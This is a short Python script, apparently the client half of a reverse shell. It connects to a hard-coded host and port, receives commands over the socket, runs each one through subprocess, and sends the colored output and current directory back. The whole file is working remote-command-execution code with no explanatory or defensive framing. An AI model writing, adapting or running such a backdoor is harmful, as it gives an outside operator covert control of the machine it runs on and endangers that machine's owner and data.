import os, socket, sys, subprocess
from threading import Thread
from colorama import Fore

# Server details
SERVER_HOST = "192.168.1.68"
SERVER_PORT = 4000
seperator_token = "<SEP>"

GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
RED = Fore.RED
RESET = Fore.RESET

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd()
s.send(cwd.encode())

command = ""

while command.lower() != "exit":
    cwd = os.getcwd()
    command = s.recv(1024).decode()
    splitted_command = command.split()
    if len(splitted_command) > 0 and splitted_command[0].lower() == "cd":
            try:
                os.chdir(' '.join(splitted_command[1:]))
                cwd = os.getcwd()
                s.send(f"{YELLOW}{''}<SEP>{GREEN}{cwd}{RESET}".encode())
            except Exception as e:
                s.send(f"{RED}Error: {e}{RESET}".encode())
    else:
        try:
            output = subprocess.getoutput(command)
            s.send(f"{YELLOW}{output}{RESET}<SEP>{GREEN}{cwd}{RESET}".encode())
        except Exception as e:
            s.send(f"{RED}Error: {e}{RESET}".encode())
    output = ""
sys.exit()